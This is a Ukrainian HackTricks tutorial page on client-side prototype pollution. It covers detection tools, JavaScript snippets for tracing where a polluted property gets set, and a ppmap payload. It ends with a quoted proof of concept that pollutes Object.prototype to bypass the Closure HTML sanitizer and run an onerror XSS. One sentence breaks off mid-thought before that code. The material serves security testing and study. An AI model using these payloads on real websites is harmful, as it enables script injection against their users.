# Пошкодження прототипу на стороні клієнта

{{#include ../../../banners/hacktricks-training.md}}

## Виявлення за допомогою автоматичних інструментів

Інструменти [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **та** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) можна використовувати для **виявлення вразливостей прототипного забруднення**.

Крім того, ви також можете використовувати **розширення браузера** [**PPScan**](https://github.com/msrkp/PPScan) для **автоматичного** **сканування** **сторінок**, які ви **відвідуєте**, на наявність вразливостей прототипного забруднення.

### Налагодження, де використовується властивість <a href="#id-5530" id="id-5530"></a>
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype, "potentialGadget", {
__proto__: null,
get() {
console.trace()
return "test"
},
})
```
### Виявлення корінної причини забруднення прототипу <a href="#id-5530" id="id-5530"></a>

Якщо вразливість забруднення прототипу була виявлена будь-яким з інструментів, і якщо код не є надто складним, ви можете знайти вразливість, шукаючи ключові слова, такі як `location.hash`, `decodeURIComponent` або `location.search` у Chrome Developer Tools. Цей підхід дозволяє точно визначити вразливу частину JavaScript-коду.

Для більших і складніших кодових баз простий метод виявлення вразливого коду включає наступні кроки:

1. Використовуйте інструмент для виявлення вразливості та отримайте корисне навантаження, призначене для встановлення властивості в конструкторі. Приклад, наданий ppmap, може виглядати так: `constructor[prototype][ppmap]=reserved`.
2. Встановіть точку зупинки на першому рядку JavaScript-коду, який буде виконуватись на сторінці. Оновіть сторінку з корисним навантаженням, призупинивши виконання на цій точці зупинки.
3. Поки виконання JavaScript призупинено, виконайте наступний скрипт у консолі JS. Цей скрипт сигналізуватиме, коли властивість 'ppmap' буде створена, що допоможе в її виявленні:
```javascript
function debugAccess(obj, prop, debugGet = true) {
var origValue = obj[prop]

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet) debugger
return origValue
},
set: function (val) {
debugger
origValue = val
},
})
}

debugAccess(Object.prototype, "ppmap")
```
4. Перейдіть назад на вкладку **Sources** і виберіть “Resume script execution”. JavaScript продовжить виконання, і властивість 'ppmap' буде забруднена, як і очікувалося. Використання наданого фрагмента коду полегшує визначення точного місця, де властивість 'ppmap' забруднена. Переглядаючи **Call Stack**, можна спостерігати різні стеки, де сталося забруднення.

При виборі, який стек досліджувати, часто корисно націлюватися на стеки, пов'язані з файлами бібліотек JavaScript, оскільки забруднення прототипів часто відбувається в цих бібліотеках. Визначте відповідний стек, перевіривши його прив'язку до файлів бібліотек (видно праворуч, подібно до зображення, наданого для орієнтира). У випадках з кількома стеками, такими як ті, що на рядках 4 і 6
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Посилання

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{{#include ../../../banners/hacktricks-training.md}}
